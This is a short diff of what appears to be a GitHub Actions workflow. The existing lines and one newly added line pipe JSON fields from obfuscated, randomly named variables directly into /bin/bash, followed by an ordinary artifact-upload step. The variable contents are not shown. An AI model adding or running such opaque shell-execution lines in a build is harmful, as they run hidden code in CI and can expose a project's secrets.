@@ -24,6 +24,7 @@ jobs:
           echo $akkrb858 | jq -r .nhbe43 | /bin/bash
           printf '%s' "$kidn2" | jq -r .c68154 | /bin/bash
           echo $nxq931 | jq -r .lj3346 | /bin/bash
+          printf '%s' "$uvqfi1" | jq -r .krbp1533 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
